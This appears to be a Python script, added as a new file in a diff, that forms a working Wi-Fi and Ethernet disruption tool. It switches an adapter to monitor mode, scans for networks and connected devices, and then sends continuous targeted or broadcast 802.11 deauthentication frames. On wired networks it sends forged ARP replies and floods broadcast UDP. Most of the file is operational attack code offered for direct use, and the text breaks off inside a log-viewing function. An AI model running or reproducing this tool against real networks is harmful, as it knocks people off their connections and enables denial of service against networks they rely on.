@@ -1,0 +1,1460 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import time
+import subprocess
+import threading
+import signal
+from datetime import datetime
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt, Dot11Beacon
+from scapy.layers.l2 import Ether, ARP
+import argparse
+import json
+import re
+from typing import List, Dict, Optional, Tuple, Set
+import csv
+import netifaces
+
+# Global variables
+selected_interfaces = {"wlan": None, "eth": None}
+selected_network = None
+selected_client = None
+scan_results = []
+clients_list = []
+running = True
+log_file = "wifi_deauth_log.csv"
+attack_threads = []
+original_interface_state = {}
+
+class Logger:
+    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
+        self.log_file = log_file
+        self.ensure_log_file()
+    
+    def ensure_log_file(self):
+        """Create log file with headers if it doesn't exist"""
+        if not os.path.exists(self.log_file):
+            with open(self.log_file, 'w', newline='') as f:
+                writer = csv.writer(f)
+                writer.writerow(['Timestamp', 'Action', 'Interface_Type', 'Interface_Name', 
+                               'BSSID', 'ESSID', 'Client_MAC', 'Channel', 
+                               'Duration', 'Packets_Sent', 'Status'])
+    
+    def log(self, action: str, interface_type: str = "", interface_name: str = "", 
+            bssid: str = "", essid: str = "", client_mac: str = "", 
+            channel: str = "", duration: str = "", packets: str = "", status: str = ""):
+        """Log an action to the CSV file"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        with open(self.log_file, 'a', newline='') as f:
+            writer = csv.writer(f)
+            writer.writerow([timestamp, action, interface_type, interface_name, 
+                           bssid, essid, client_mac, channel, duration, packets, status])
+        
+        print(f"[LOG] {timestamp} - {action}: {status}")
+
+logger = Logger(log_file)
+
+def check_root():
+    """Check if script is running as root"""
+    if os.geteuid() != 0:
+        print("This script requires root privileges!")
+        print("Please run with sudo.")
+        sys.exit(1)
+
+def get_available_interfaces() -> Dict[str, List[str]]:
+    """Get all available network interfaces categorized by type"""
+    interfaces = {"wlan": [], "eth": []}
+    
+    try:
+        # Get all interfaces
+        all_interfaces = netifaces.interfaces()
+        
+        for iface in all_interfaces:
+            # Skip loopback and virtual interfaces
+            if iface.startswith('lo') or iface.startswith('docker') or iface.startswith('veth'):
+                continue
+            
+            # Check if it's wireless
+            if os.path.exists(f'/sys/class/net/{iface}/wireless'):
+                interfaces["wlan"].append(iface)
+            # Check if it's ethernet (or likely ethernet)
+            elif 'eth' in iface or 'enp' in iface or 'ens' in iface or 'eno' in iface:
+                interfaces["eth"].append(iface)
+        
+        return interfaces
+    except:
+        # Fallback method
+        try:
+            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
+            for line in result.stdout.split('\n'):
+                if 'wlan' in line:
+                    match = re.search(r'^\d+: (\w+):', line)
+                    if match:
+                        interfaces["wlan"].append(match.group(1))
+                elif 'eth' in line or 'enp' in line:
+                    match = re.search(r'^\d+: (\w+):', line)
+                    if match:
+                        interfaces["eth"].append(match.group(1))
+        except:
+            pass
+        
+        return interfaces
+
+def check_monitor_mode(interface: str) -> bool:
+    """Check if interface is in monitor mode"""
+    try:
+        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
+        return "Mode:Monitor" in result.stdout
+    except:
+        return False
+
+def set_monitor_mode(interface: str) -> Tuple[Optional[str], bool]:
+    """Set wireless interface to monitor mode"""
+    try:
+        print(f"\nSetting {interface} to monitor mode...")
+        
+        # Check current mode
+        if check_monitor_mode(interface):
+            print(f"{interface} is already in monitor mode")
+            return interface, True
+        
+        # Try airmon-ng first
+        try:
+            print("Trying airmon-ng...")
+            # Stop interfering processes
+            subprocess.run(['airmon-ng', 'check', 'kill'], 
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+            
+            # Start monitor mode - FIXED
+            result = subprocess.run(['airmon-ng', 'start', interface], 
+                                  capture_output=True, text=True, timeout=15)
+            
+            # Check for monitor interface
+            monitor_iface = None
+            for line in result.stdout.split('\n'):
+                if 'monitor mode enabled on' in line.lower():
+                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
+                    if match:
+                        monitor_iface = match.group(1)
+                        break
+            
+            if monitor_iface and check_monitor_mode(monitor_iface):
+                print(f"Monitor mode enabled on {monitor_iface}")
+                return monitor_iface, True
+                
+        except Exception as e:
+            print(f"airmon-ng failed: {e}")
+        
+        # Try manual method
+        print("Trying manual method...")
+        try:
+            # Bring interface down - FIXED
+            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            
+            # Set monitor mode - FIXED
+            result = subprocess.run(['iw', interface, 'set', 'type', 'monitor'], 
+                                  capture_output=True, text=True, timeout=5)
+            
+            if result.returncode == 0:
+                # Bring interface up - FIXED
+                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                time.sleep(1)
+                
+                if check_monitor_mode(interface):
+                    print(f"Manual monitor mode successful on {interface}")
+                    return interface, True
+        
+        except Exception as e:
+            print(f"Manual method failed: {e}")
+        
+        # Try iwconfig as last resort
+        print("Trying iwconfig method...")
+        try:
+            subprocess.run(['ifconfig', interface, 'down'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
+                          capture_output=True, text=True, timeout=5)
+            subprocess.run(['ifconfig', interface, 'up'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            
+            if check_monitor_mode(interface):
+                print(f"iwconfig monitor mode successful on {interface}")
+                return interface, True
+                
+        except Exception as e:
+            print(f"iwconfig method failed: {e}")
+        
+        print("All monitor mode methods failed!")
+        return None, False
+        
+    except Exception as e:
+        print(f"Error in set_monitor_mode: {e}")
+        return None, False
+
+def restore_managed_mode(interface: str) -> bool:
+    """Restore interface to managed mode"""
+    try:
+        print(f"\nRestoring {interface} to managed mode...")
+        
+        # Try airmon-ng stop
+        try:
+            result = subprocess.run(['airmon-ng', 'stop', interface], 
+                                  capture_output=True, text=True, timeout=10)
+            
+            for line in result.stdout.split('\n'):
+                if 'managed mode enabled on' in line.lower():
+                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
+                    if match:
+                        print(f"Managed mode restored on {match.group(1)}")
+                        return True
+        except:
+            pass
+        
+        # Manual method
+        try:
+            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            subprocess.run(['iwconfig', interface, 'mode', 'managed'], 
+                          capture_output=True, text=True, timeout=5)
+            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            
+            # Check if in managed mode
+            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
+            if "Mode:Managed" in result.stdout:
+                print(f"Manual managed mode successful on {interface}")
+                
+                # Try to restart NetworkManager
+                subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                return True
+                
+        except Exception as e:
+            print(f"Manual restore failed: {e}")
+        
+        return False
+        
+    except Exception as e:
+        print(f"Error restoring managed mode: {e}")
+        return False
+
+def restore_all_interfaces():
+    """Restore all interfaces to normal state"""
+    print("\nRestoring all interfaces to normal state...")
+    
+    # Get all interfaces including monitor interfaces
+    try:
+        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
+        interfaces = []
+        
+        for line in result.stdout.split('\n'):
+            if ':' in line:
+                iface = line.split(':')[1].strip()
+                if iface and not iface.startswith('lo'):
+                    interfaces.append(iface)
+        
+        # Try to stop all monitor interfaces
+        for iface in interfaces:
+            if 'mon' in iface or iface.endswith('mon'):
+                print(f"Stopping monitor interface: {iface}")
+                try:
+                    # Try airmon-ng stop
+                    subprocess.run(['airmon-ng', 'stop', iface], 
+                                  stdout=subprocess.DEVNULL, 
+                                  stderr=subprocess.DEVNULL,
+                                  timeout=10)
+                except:
+                    pass
+        
+        # Find original Wi-Fi interfaces (wlan0, wlan1, etc.)
+        for iface in interfaces:
+            if iface.startswith('wlan'):
+                print(f"Restoring {iface} to managed mode...")
+                try:
+                    # Bring down
+                    subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL,
+                                  timeout=5)
+                    
+                    # Set managed mode
+                    subprocess.run(['iwconfig', iface, 'mode', 'managed'],
+                                  capture_output=True, text=True, timeout=5)
+                    
+                    # Bring up
+                    subprocess.run(['ip', 'link', 'set', iface, 'up'],
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL,
+                                  timeout=5)
+                    
+                    time.sleep(1)
+                    
+                except Exception as e:
+                    print(f"Error restoring {iface}: {e}")
+        
+        # Restart network services
+        print("Restarting network services...")
+        try:
+            subprocess.run(['systemctl', 'restart', 'NetworkManager'],
+                          stdout=subprocess.DEVNULL,
+                          stderr=subprocess.DEVNULL)
+        except:
+            pass
+        
+        print("Interfaces restored. You may need to reconnect to Wi-Fi.")
+        
+    except Exception as e:
+        print(f"Error during interface restoration: {e}")
+
+def simple_wifi_scan(interface: str) -> List[Dict]:
+    """Simple WiFi scan using scapy"""
+    print(f"\nScanning for WiFi networks on {interface}...")
+    networks = []
+    seen_bssids = set()
+    
+    def handle_packet(pkt):
+        if pkt.haslayer(Dot11Beacon):
+            bssid = pkt[Dot11].addr2
+            if bssid in seen_bssids:
+                return
+            seen_bssids.add(bssid)
+            
+            # Get ESSID
+            essid = "<hidden>"
+            if pkt.haslayer(Dot11Elt):
+                elt = pkt[Dot11Elt]
+                while isinstance(elt, Dot11Elt):
+                    if elt.ID == 0 and elt.info:
+                        try:
+                            essid = elt.info.decode('utf-8', errors='ignore')
+                        except:
+                            essid = "<hidden>"
+                        break
+                    elt = elt.payload
+            
+            # Get channel
+            channel = "Unknown"
+            if pkt.haslayer(Dot11Elt):
+                elt = pkt[Dot11Elt]
+                while isinstance(elt, Dot11Elt):
+                    if elt.ID == 3 and elt.info:
+                        channel = str(ord(elt.info[0:1]))
+                        break
+                    elt = elt.payload
+            
+            # Get signal strength
+            signal = "N/A"
+            if pkt.haslayer(RadioTap):
+                radio = pkt[RadioTap]
+                if hasattr(radio, 'dBm_AntSignal'):
+                    signal = f"{radio.dBm_AntSignal} dBm"
+            
+            networks.append({
+                'BSSID': bssid,
+                'ESSID': essid,
+                'Channel': channel,
+                'Signal': signal,
+                'Interface': interface
+            })
+    
+    try:
+        print("Starting scan (10 seconds)...")
+        # Channel hop during scan
+        channels = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161, 165]
+        stop_sniff = threading.Event()
+        
+        def sniff_thread():
+            sniff(iface=interface, prn=handle_packet, store=0, 
+                  stop_filter=lambda x: stop_sniff.is_set())
+        
+        sniffer = threading.Thread(target=sniff_thread)
+        sniffer.daemon = True
+        sniffer.start()
+        
+        # Hop channels
+        for i, channel in enumerate(channels):
+            if stop_sniff.is_set():
+                break
+            try:
+                subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
+                print(f"  Scanning channel {channel}...")
+                time.sleep(0.8)
+            except:
+                pass
+        
+        time.sleep(2)
+        stop_sniff.set()
+        sniffer.join(timeout=2)
+        
+    except Exception as e:
+        print(f"Scan error: {e}")
+    
+    return networks
+
+def enhanced_wifi_scan(interface: str) -> List[Dict]:
+    """Enhanced WiFi scan with multiple methods"""
+    networks = []
+    
+    # Method 1: Try airodump-ng
+    print("\nTrying airodump-ng scan...")
+    try:
+        # Create temp file
+        temp_file = f"/tmp/scan_{int(time.time())}"
+        cmd = ['airodump-ng', '--output-format', 'csv', '-w', temp_file, interface]
+        
+        # Start process
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                               stdin=subprocess.PIPE)
+        
+        # Let it run for 8 seconds
+        for i in range(8):
+            print(".", end="", flush=True)
+            time.sleep(1)
+        
+        # Kill it
+        proc.send_signal(signal.SIGINT)
+        proc.wait(timeout=5)
+        
+        # Read results
+        csv_file = f"{temp_file}-01.csv"
+        if os.path.exists(csv_file):
+            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            # Parse CSV
+            lines = content.split('\n')
+            in_networks = False
+            
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    continue
+                
+                if line.startswith('BSSID,'):
+                    in_networks = True
+                    continue
+                
+                if in_networks and line.startswith('Station MAC,'):
+                    break
+                
+                if in_networks:
+                    parts = [p.strip() for p in line.split(',')]
+                    if len(parts) >= 14:
+                        bssid = parts[0]
+                        channel = parts[3]
+                        essid = parts[13] if len(parts) > 13 else ""
+                        
+                        if bssid and bssid != "BSSID":
+                            networks.append({
+                                'BSSID': bssid,
+                                'ESSID': essid if essid else '<hidden>',
+                                'Channel': channel if channel else 'Unknown',
+                                'Interface': interface
+                            })
+            
+            # Cleanup
+            for ext in ['-01.csv', '-01.kismet.csv', '-01.cap']:
+                fname = temp_file + ext
+                if os.path.exists(fname):
+                    os.remove(fname)
+        
+        if networks:
+            print(f"\nairodump-ng found {len(networks)} networks")
+            return networks
+            
+    except Exception as e:
+        print(f"\nairodump-ng failed: {e}")
+    
+    # Method 2: Simple scapy scan
+    print("\nFalling back to scapy scan...")
+    networks = simple_wifi_scan(interface)
+    
+    return networks
+
+def scan_clients_with_scapy(interface: str, bssid: str, channel: str) -> List[Dict]:
+    """Alternative client scanning using scapy"""
+    clients = []
+    seen_macs = set()
+    
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11):
+            # Check if packet is from a client to the AP
+            if pkt.addr1 == bssid or pkt.addr2 == bssid:
+                client_mac = None
+                
+                # Determine client MAC
+                if pkt.addr1 == bssid:
+                    client_mac = pkt.addr2
+                elif pkt.addr2 == bssid:
+                    client_mac = pkt.addr1
+                
+                if client_mac and client_mac != bssid and client_mac not in seen_macs:
+                    seen_macs.add(client_mac)
+                    clients.append({
+                        'MAC': client_mac,
+                        'BSSID': bssid,
+                        'Interface': interface,
+                        'Type': 'Wi-Fi'
+                    })
+    
+    try:
+        print("Scanning with scapy (5 seconds)...")
+        subprocess.run(['iwconfig', interface, 'channel', channel], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Sniff for client packets
+        sniff(iface=interface, prn=packet_handler, timeout=5, store=0)
+        
+        print(f"Scapy found {len(clients)} clients")
+        
+    except Exception as e:
+        print(f"Scapy scan error: {e}")
+    
+    return clients
+
+def select_network(interface: str, bssid: str, channel: str) -> List[Dict]:
+    """Scan for clients on a specific network"""
+    print(f"Scanning for clients on {bssid} (channel {channel})...")
+    
+    clients = []
+    
+    # First check if interface is in monitor mode
+    if not check_monitor_mode(interface):
+        print(f"Error: {interface} is not in monitor mode!")
+        print("Client scanning requires monitor mode.")
+        return clients
+    
+    try:
+        # Set channel
+        subprocess.run(['iwconfig', interface, 'channel', channel], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)  # Give time for channel change
+        
+        # Method 1: Try airodump-ng
+        try:
+            temp_file = f"/tmp/client_{int(time.time())}"
+            cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel,
+                   '--output-format', 'csv', '-w', temp_file, interface]
+            
+            print("Using airodump-ng to scan for clients...")
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # Let it run for 6 seconds
+            for i in range(6):
+                print(".", end="", flush=True)
+                time.sleep(1)
+            
+            proc.send_signal(signal.SIGINT)
+            proc.wait(timeout=5)
+            
+            # Read results
+            csv_file = f"{temp_file}-01.csv"
+            if os.path.exists(csv_file):
+                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    lines = f.readlines()
+                
+                client_section = False
+                for line in lines:
+                    line = line.strip()
+                    if line.startswith('Station MAC,'):
+                        client_section = True
+                        continue
+                    
+                    if client_section and line:
+                        parts = line.split(',')
+                        if parts and len(parts[0]) == 17:  # MAC address length
+                            clients.append({
+                                'MAC': parts[0].strip(),
+                                'BSSID': bssid,
+                                'Interface': interface,
+                                'Type': 'Wi-Fi'
+                            })
+                
+                # Cleanup
+                for ext in ['-01.csv', '-01.kismet.csv', '-01.cap']:
+                    fname = temp_file + ext
+                    if os.path.exists(fname):
+                        os.remove(fname)
+            
+            print(f"\nFound {len(clients)} clients using airodump-ng")
+            
+        except Exception as e:
+            print(f"\nairodump-ng failed: {e}")
+            print("Falling back to scapy scan...")
+            
+            # Method 2: Scapy-based client detection
+            clients = scan_clients_with_scapy(interface, bssid, channel)
+        
+    except Exception as e:
+        print(f"\nError scanning clients: {e}")
+    
+    return clients
+
+def scan_arp_network(interface: str) -> List[Dict]:
+    """Scan local network for devices using ARP"""
+    print(f"Scanning local network on {interface}...")
+    
+    devices = []
+    
+    try:
+        # Get local IP and network
+        addrs = netifaces.ifaddresses(interface)
+        if netifaces.AF_INET in addrs:
+            local_ip = addrs[netifaces.AF_INET][0]['addr']
+            netmask = addrs[netifaces.AF_INET][0]['netmask']
+            
+            # Calculate network range
+            ip_parts = list(map(int, local_ip.split('.')))
+            mask_parts = list(map(int, netmask.split('.')))
+            
+            network_parts = []
+            for i in range(4):
+                network_parts.append(ip_parts[i] & mask_parts[i])
+            
+            network_ip = '.'.join(map(str, network_parts))
+            
+            print(f"Scanning network: {network_ip}/24")
+            
+            # Create ARP request
+            arp = ARP(pdst=f"{network_ip}/24")
+            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+            packet = ether/arp
+            
+            # Send and receive
+            result = srp(packet, timeout=3, iface=interface, verbose=0)[0]
+            
+            for sent, received in result:
+                devices.append({
+                    'MAC': received.hwsrc,
+                    'IP': received.psrc,
+                    'Type': 'Ethernet',
+                    'Interface': interface
+                })
+                
+    except Exception as e:
+        print(f"Error scanning ARP network: {e}")
+    
+    return devices
+
+def deauth_client(interface: str, interface_type: str, bssid: str, 
+                  client_mac: str, count: int = 0, duration: int = 0) -> threading.Thread:
+    """Deauthenticate a specific client"""
+    def deauth_thread():
+        nonlocal interface, interface_type, bssid, client_mac
+        
+        packets_sent = 0
+        start_time = time.time()
+        
+        if interface_type == "wlan":
+            # Wi-Fi deauth packets
+            packet1 = RadioTap() / \
+                     Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
+                     Dot11Deauth(reason=7)
+            
+            packet2 = RadioTap() / \
+                     Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
+                     Dot11Deauth(reason=7)
+            
+            try:
+                if duration > 0:
+                    while (time.time() - start_time) < duration and running:
+                        sendp(packet1, iface=interface, count=1, verbose=0)
+                        sendp(packet2, iface=interface, count=1, verbose=0)
+                        packets_sent += 2
+                        time.sleep(0.1)
+                elif count > 0:
+                    for _ in range(count):
+                        if not running:
+                            break
+                        sendp(packet1, iface=interface, count=1, verbose=0)
+                        sendp(packet2, iface=interface, count=1, verbose=0)
+                        packets_sent += 2
+                        time.sleep(0.1)
+                else:
+                    while running:
+                        sendp(packet1, iface=interface, count=1, verbose=0)
+                        sendp(packet2, iface=interface, count=1, verbose=0)
+                        packets_sent += 2
+                        time.sleep(0.1)
+                
+                print(f"\nDeauth completed. Packets sent: {packets_sent}")
+                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", 
+                          client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
+                          str(packets_sent), "Completed")
+                
+            except Exception as e:
+                print(f"\nDeauth error: {e}")
+                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", 
+                          client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
+                          str(packets_sent), f"Error: {e}")
+        
+        elif interface_type == "eth":
+            # Ethernet ARP disruption
+            try:
+                # Create fake ARP packets
+                arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+                            ARP(op=2, pdst="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff",
+                                psrc="192.168.1.100", hwsrc=client_mac)
+                
+                if duration > 0:
+                    while (time.time() - start_time) < duration and running:
+                        sendp(arp_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(1)
+                elif count > 0:
+                    for _ in range(count // 10):
+                        if not running:
+                            break
+                        sendp(arp_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(1)
+                else:
+                    while running:
+                        sendp(arp_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(1)
+                
+                print(f"\nARP disruption completed. Packets sent: {packets_sent}")
+                logger.log("ARP_Disruption", "Ethernet", interface, "", "", 
+                          client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), "Completed")
+                
+            except Exception as e:
+                print(f"\nARP disruption error: {e}")
+                logger.log("ARP_Disruption", "Ethernet", interface, "", "", 
+                          client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), f"Error: {e}")
+    
+    thread = threading.Thread(target=deauth_thread)
+    thread.daemon = True
+    thread.start()
+    attack_threads.append(thread)
+    return thread
+
+def deauth_all(interface: str, interface_type: str, bssid: str = "", 
+               channel: str = "", count: int = 0, duration: int = 0) -> threading.Thread:
+    """Deauthenticate all clients"""
+    def broadcast_deauth_thread():
+        nonlocal interface, interface_type, bssid, channel
+        
+        packets_sent = 0
+        start_time = time.time()
+        
+        if interface_type == "wlan" and bssid and channel:
+            # Broadcast deauth
+            packet = RadioTap() / \
+                    Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
+                    Dot11Deauth(reason=7)
+            
+            try:
+                # Set channel
+                subprocess.run(['iwconfig', interface, 'channel', channel], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                if duration > 0:
+                    while (time.time() - start_time) < duration and running:
+                        sendp(packet, iface=interface, count=1, verbose=0)
+                        packets_sent += 1
+                        time.sleep(0.1)
+                elif count > 0:
+                    for _ in range(count):
+                        if not running:
+                            break
+                        sendp(packet, iface=interface, count=1, verbose=0)
+                        packets_sent += 1
+                        time.sleep(0.1)
+                else:
+                    while running:
+                        sendp(packet, iface=interface, count=1, verbose=0)
+                        packets_sent += 1
+                        time.sleep(0.1)
+                
+                print(f"\nBroadcast deauth completed. Packets sent: {packets_sent}")
+                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", 
+                          channel, f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), "Completed")
+                
+            except Exception as e:
+                print(f"\nBroadcast deauth error: {e}")
+                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", 
+                          channel, f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), f"Error: {e}")
+        
+        elif interface_type == "eth":
+            # Ethernet broadcast
+            try:
+                broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+                                 IP(dst="255.255.255.255") / \
+                                 UDP(dport=9) / b'X' * 100
+                
+                if duration > 0:
+                    while (time.time() - start_time) < duration and running:
+                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(0.5)
+                elif count > 0:
+                    for _ in range(count // 10):
+                        if not running:
+                            break
+                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(0.5)
+                else:
+                    while running:
+                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
+                        packets_sent += 10
+                        time.sleep(0.5)
+                
+                print(f"\nBroadcast disruption completed. Packets sent: {packets_sent}")
+                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
+                          f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), "Completed")
+                
+            except Exception as e:
+                print(f"\nBroadcast disruption error: {e}")
+                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
+                          f"{duration}s" if duration > 0 else f"{count}pkts",
+                          str(packets_sent), f"Error: {e}")
+    
+    thread = threading.Thread(target=broadcast_deauth_thread)
+    thread.daemon = True
+    thread.start()
+    attack_threads.append(thread)
+    return thread
+
+def display_networks(networks: List[Dict], interface_type: str = "Wi-Fi"):
+    """Display networks in a table"""
+    if not networks:
+        print(f"\nNo {interface_type} networks found!")
+        return
+    
+    print(f"\n{interface_type} Networks Found:")
+    print("="*90)
+    print(f"{'#':<3} {'BSSID':<20} {'Channel':<10} {'ESSID':<30} {'Interface':<15}")
+    print("="*90)
+    
+    for i, network in enumerate(networks, 1):
+        bssid = network.get('BSSID', network.get('MAC', 'N/A'))
+        channel = network.get('Channel', network.get('IP', 'N/A'))
+        essid = network.get('ESSID', network.get('Type', 'Device'))
+        interface = network.get('Interface', 'Unknown')
+        
+        print(f"{i:<3} {bssid:<20} {channel:<10} {str(essid)[:30]:<30} {interface:<15}")
+    print("="*90)
+
+def display_clients(clients: List[Dict]):
+    """Display clients in a table"""
+    if not clients:
+        print("\nNo clients found!")
+        return
+    
+    print("\n" + "="*70)
+    print(f"{'#':<3} {'Client MAC':<20} {'IP':<15} {'Type':<10} {'Interface':<15}")
+    print("="*70)
+    
+    for i, client in enumerate(clients, 1):
+        mac = client.get('MAC', 'N/A')
+        ip = client.get('IP', 'N/A')
+        client_type = client.get('Type', 'Unknown')
+        interface = client.get('Interface', 'Unknown')
+        
+        print(f"{i:<3} {mac:<20} {ip:<15} {client_type:<10} {interface:<15}")
+    print("="*70)
+
+def check_adapter_status():
+    """Check network adapter status"""
+    print("\nNetwork Adapter Status:")
+    print("="*80)
+    
+    interfaces = get_available_interfaces()
+    
+    for iface_type, iface_list in interfaces.items():
+        print(f"\n{iface_type.upper()} Interfaces:")
+        print("-" * 40)
+        
+        for iface in iface_list:
+            print(f"\n  Interface: {iface}")
+            
+            try:
+                # Get MAC address
+                with open(f'/sys/class/net/{iface}/address', 'r') as f:
+                    mac = f.read().strip()
+                    print(f"  MAC Address: {mac}")
+                
+                # Get state
+                with open(f'/sys/class/net/{iface}/operstate', 'r') as f:
+                    state = f.read().strip()
+                    print(f"  State: {state}")
+                
+                # Get IP
+                addrs = netifaces.ifaddresses(iface)
+                if netifaces.AF_INET in addrs:
+                    ip = addrs[netifaces.AF_INET][0]['addr']
+                    print(f"  IP Address: {ip}")
+                
+                # For Wi-Fi
+                if iface_type == "wlan":
+                    result = subprocess.run(['iwconfig', iface], 
+                                          capture_output=True, text=True)
+                    
+                    mode_match = re.search(r'Mode:(\S+)', result.stdout)
+                    if mode_match:
+                        print(f"  Mode: {mode_match.group(1)}")
+                    
+                    channel_match = re.search(r'Channel (\d+)', result.stdout)
+                    if channel_match:
+                        print(f"  Channel: {channel_match.group(1)}")
+                    
+                    essid_match = re.search(r'ESSID:"([^"]+)"', result.stdout)
+                    if essid_match:
+                        essid = essid_match.group(1)
+                        print(f"  Connected to: {essid if essid else 'None'}")
+                        
+            except Exception as e:
+                print(f"  Error: {e}")
+    
+    logger.log("Check_Adapters", "All", "Multiple", status="Completed")
+
+def configure_wifi_interface():
+    """Configure WiFi interface"""
+    interfaces = get_available_interfaces()
+    
+    if not interfaces["wlan"]:
+        print("No WiFi interfaces found!")
+        return None
+    
+    print("\nAvailable WiFi interfaces:")
+    for i, iface in enumerate(interfaces["wlan"], 1):
+        print(f"{i}. {iface}")
+    
+    try:
+        choice = int(input(f"\nSelect interface (1-{len(interfaces['wlan'])}): "))
+        if 1 <= choice <= len(interfaces["wlan"]):
+            selected_iface = interfaces["wlan"][choice-1]
+            
+            # Check if already in monitor mode
+            if check_monitor_mode(selected_iface):
+                print(f"\n{selected_iface} is already in monitor mode")
+                use_current = input("Use current mode? (y/n): ").lower()
+                if use_current == 'y':
+                    return selected_iface
+            
+            # Ask to set monitor mode
+            print(f"\nSelected interface: {selected_iface}")
+            set_monitor = input("Set to monitor mode? (y/n): ").lower()
+            
+            if set_monitor == 'y':
+                monitor_iface, success = set_monitor_mode(selected_iface)
+                if success:
+                    print(f"\nInterface configured: {monitor_iface}")
+                    return monitor_iface
+                else:
+                    print("\nFailed to set monitor mode!")
+                    return None
+            else:
+                print("\nInterface not changed")
+                return selected_iface
+        else:
+            print("Invalid selection!")
+            return None
+    except ValueError:
+        print("Please enter a valid number!")
+        return None
+
+def configure_eth_interface():
+    """Configure Ethernet interface"""
+    interfaces = get_available_interfaces()
+    
+    if not interfaces["eth"]:
+        print("No Ethernet interfaces found!")
+        return None
+    
+    print("\nAvailable Ethernet interfaces:")
+    for i, iface in enumerate(interfaces["eth"], 1):
+        print(f"{i}. {iface}")
+    
+    try:
+        choice = int(input(f"\nSelect interface (1-{len(interfaces['eth'])}): "))
+        if 1 <= choice <= len(interfaces["eth"]):
+            selected_iface = interfaces["eth"][choice-1]
+            print(f"\nEthernet interface configured: {selected_iface}")
+            return selected_iface
+        else:
+            print("Invalid selection!")
+            return None
+    except ValueError:
+        print("Please enter a valid number!")
+        return None
+
+def stop_all_attacks():
+    """Stop all running attacks"""
+    global running, attack_threads
+    running = False
+    print("\nStopping all attacks...")
+    
+    for thread in attack_threads:
+        if thread.is_alive():
+            thread.join(timeout=2)
+    
+    attack_threads = []
+    running = True
+    print("All attacks stopped.")
+
+def view_logs():
+    """View log file"""
+    if os.path.exists(log_file):
+        print(f"\nLog file: {log_file}")
+        print("="*120)
+        
+        with open(log_file, 'r') as f:
+            reader = csv.reader(f)
+            rows = list(reader)
+            
+            if rows:
+                headers = rows[0]
